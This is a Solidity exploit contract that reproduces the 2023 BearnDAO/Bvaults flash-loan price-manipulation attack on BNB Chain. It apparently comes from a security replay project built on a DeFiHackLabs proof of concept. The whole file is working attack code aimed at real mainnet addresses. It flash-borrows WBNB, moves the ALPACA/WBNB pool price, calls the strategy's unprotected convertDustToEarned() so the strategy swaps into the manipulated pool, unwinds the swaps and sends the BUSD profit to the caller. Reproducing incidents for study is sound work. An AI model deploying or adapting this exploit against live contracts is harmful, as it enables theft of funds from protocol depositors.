// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

// Synthetic standalone exploit for the EVM Playground (2023-12-BEARNDAO).
// The DeFiHackLabs PoC runs the attack INLINE in the Foundry test contract: the
// nested PancakeSwap flash-swap callback `pancakeCall` lives on the test itself
// (address(this) is both the flash-swap initiator and the callback target), so
// there is no standalone exploit contract to deploy from the original attack tx.
// This synthetic contract faithfully reproduces that inline sequence as a
// deployable contract (no forge-std/cheatcodes) for the recorder.
//
// Root cause: BvaultsStrategy.convertDustToEarned() is public, has no slippage
// protection (amountOutMin = 0), and swaps the strategy's ENTIRE BUSD "dust"
// balance along a hard-coded, attacker-known route (BUSD -> WBNB -> ALPACA). The
// attacker flash-borrows WBNB, crashes the ALPACA/WBNB pool price, triggers the
// strategy's dust conversion into that manipulated pool, then reverses the price
// moves to harvest the value the strategy just donated.
import "./../interface.sol";

interface IBvaultsStrategy {
    function convertDustToEarned() external;
}

contract Exploit {
    IWBNB constant WBNB = IWBNB(payable(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c));
    IERC20 constant ALPACA = IERC20(0x8F0528cE5eF7B51152A59745bEfDD91D97091d2F);
    IERC20 constant BUSD = IERC20(0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56);
    Uni_Pair_V2 constant CAKE_WBNB = Uni_Pair_V2(0x0eD7e52944161450477ee417DE9Cd3a859b14fD0);
    Uni_Router_V2 constant Router = Uni_Router_V2(0x05fF2B0DB69458A0750badebc4f9e13aDd608C7F);
    IBvaultsStrategy constant BvaultsStrategy = IBvaultsStrategy(0x21125d94Cfe886e7179c8D2fE8c1EA8D57C73E0e);

    // Flash-loan repay for a 10,000 WBNB borrow at PancakeSwap's 0.25% swap fee,
    // i.e. (10_000e18 / 9975) * 10_000 + 10_000, computed off-chain (matches the
    // original attack contract's on-chain repay to the wei). The original PoC
    // read this from a self-destructed helper contract's storage slot via
    // `vm.load`; that helper no longer exists on-chain for a live replay, so the
    // value is hardcoded here instead.
    uint256 constant REPAY_AMOUNT = 10_025_062_656_641_604_020_000;

    constructor() {
        WBNB.approve(address(Router), type(uint256).max);
        ALPACA.approve(address(Router), type(uint256).max);
    }

    // Lets the setup step wrap a small amount of native BNB into WBNB below,
    // mirroring the small WBNB top-up the original attack's second (now
    // self-destructed) helper contract supplied before the flash-loan repay.
    receive() external payable {}

    // Entry point for the recorder: kick off the flash swap. The callback
    // (`pancakeCall`) does the actual attack; on return, forward the BUSD
    // profit sitting on this contract to the caller.
    function exploit() external {
        CAKE_WBNB.swap(0, 10_000 * 1e18, address(this), abi.encode(0));

        uint256 profit = BUSD.balanceOf(address(this));
        if (profit > 0) {
            BUSD.transfer(msg.sender, profit);
        }
    }

    function pancakeCall(address, uint256, uint256, bytes calldata) external {
        require(msg.sender == address(CAKE_WBNB), "bad callback");

        WBNB_ALPACA();
        // Flawed function: public, full-balance, amountOutMin = 0 dust conversion.
        BvaultsStrategy.convertDustToEarned();
        ALPACA_WBNB();
        WBNB_BUSD();

        // Top up ~1 WBNB from native BNB pre-funded via the config's `setup`
        // step (see 2023-12-BEARNDAO.mjs), replaying the small top-up the
        // original attack's second helper contract supplied here before repay.
        if (address(this).balance > 0) {
            WBNB.deposit{value: address(this).balance}();
        }

        // Flashloan repay.
        WBNB.transfer(address(CAKE_WBNB), REPAY_AMOUNT);
    }

    function WBNB_ALPACA() internal {
        address[] memory path = new address[](2);
        path[0] = address(WBNB);
        path[1] = address(ALPACA);
        Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            WBNB.balanceOf(address(this)), 0, path, address(this), block.timestamp
        );
    }

    function ALPACA_WBNB() internal {
        address[] memory path = new address[](2);
        path[0] = address(ALPACA);
        path[1] = address(WBNB);
        Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            ALPACA.balanceOf(address(this)), 0, path, address(this), block.timestamp
        );
    }

    function WBNB_BUSD() internal {
        address[] memory path = new address[](2);
        path[0] = address(WBNB);
        path[1] = address(BUSD);
        // Reserve REPAY_AMOUNT for the flash-loan repay, plus the 1 WBNB margin
        // the setup top-up (deposited after this swap, see pancakeCall) covers -
        // mirrors the original PoC's `balance - getAmount() + 1e18` amountIn.
        uint256 amountIn = WBNB.balanceOf(address(this)) - REPAY_AMOUNT + 1e18;
        Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(amountIn, 0, path, address(this), block.timestamp);
    }
}
